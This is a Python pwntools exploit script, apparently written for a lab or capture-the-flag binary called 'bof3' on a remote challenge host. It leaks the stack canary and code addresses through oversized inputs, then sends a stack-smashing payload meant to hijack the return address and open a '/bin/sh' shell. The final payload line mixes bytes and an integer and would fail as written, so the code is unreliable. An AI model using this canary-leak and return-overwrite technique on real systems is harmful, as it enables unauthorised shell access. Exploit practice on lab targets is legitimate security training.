#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10259

mov_addr = 0x3a8e3


r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
else:
    r = remote('up.zoolab.org', port)

payload = flat(asm('nop') * 40)
r.sendafter(b"What's your name? ", payload)
r.recvuntil(b"Welcome, "+flat(asm('nop') * 40))
canary = r.recvline()[:-1]
if canary == b'':
    canary = b'\x00'
else:
    canary = canary[0]

payload = flat(asm('nop') * 41)
r.sendafter(b"What's the room number? ", payload)
r.recvuntil(b"The room number is: "+flat(asm('nop') * 41))
res = r.recvline()
canary = canary+res[:7]
buf_addr = u64(res[7:-1].ljust(8, b'\x00'))-0x40
# print(hex(u64(canary)))
# print(hex(buf_addr))

# objdump -S bof3 > bof3.txt
payload = flat(asm('nop') * 56)
r.sendafter(b"What's the customer's name? ", payload)
r.recvuntil(b"The customer's name is: "+flat(asm('nop') * 56))
main_108 = u64(r.recvline()[:-1].ljust(8, b'\x00'))
# 0x8ad0-0x8a64 = 0x6C
main = main_108 - 0x6C
base_addr = main - 0x8a64
# print(hex(base_addr))

r.sendafter(b"Leave your message: ", b"/bin/sh".ljust(40, b'\x00')+canary+asm('nop')*8+base_addr+0xd31e0)

r.interactive()

